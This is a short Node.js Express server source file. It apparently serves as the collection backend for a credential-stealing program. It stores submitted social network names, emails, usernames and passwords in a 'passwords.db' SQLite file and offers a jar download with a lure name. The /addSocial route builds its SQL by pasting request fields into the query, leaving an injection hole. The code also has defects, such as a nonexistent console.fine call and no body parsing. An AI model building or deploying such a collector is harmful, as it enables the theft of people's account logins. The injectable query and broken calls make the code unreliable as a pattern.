import http from 'http';
import express from 'express';
import fs from 'fs';
import path from 'path';
import sqlite3 from 'sqlite3';

const app = express();
const server = http.createServer(app);

const database = new sqlite3.Database("passwords.db", sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err && err.code == "SQLITE_CANTOPEN") {
        console.error("Can not create or open database");
        return;
    } else if (err) {
        console.error(`Can not create or open database : ${err.toString()}`);
    }
});


let createTables = fs.readFileSync("tablesCreation.sql", 'utf8');
database.exec(createTables, (err) => {
    if(err) {
        console.error(`Can not create tables : ${err.toString()}`);
        return;
    } else console.log("Database state updated.");
});



app.use(express.static('/public'));


app.get('/', (req, res) => {
    res.send('Hello World');
});

app.get('/download', (req, res) => {
    res.download("build/YouAreJustACutie.jar");
});

app.get('/wallpaper', (req, res) => {
    const files = fs.readdirSync(path.join('public'));
    const randomFile = files[Math.floor(Math.random() * files.length)];
    res.download(path.join('public', randomFile));
});


app.post('/addSocial', (req, res) => {
    database.exec(`INSERT INTO accounts (social, email, username, password) VALUES ('${req.body.social}','${req.body.email}','${req.body.username}','${req.body.password}')`, (err) => {
        if(err) {
            console.error(`Can not insert data : ${err.toString()}`);
            return;
        } else console.fine("Data inserted.");
    });
});


server.listen(1570, () => {
    console.log(`Server running on port 1570`);
});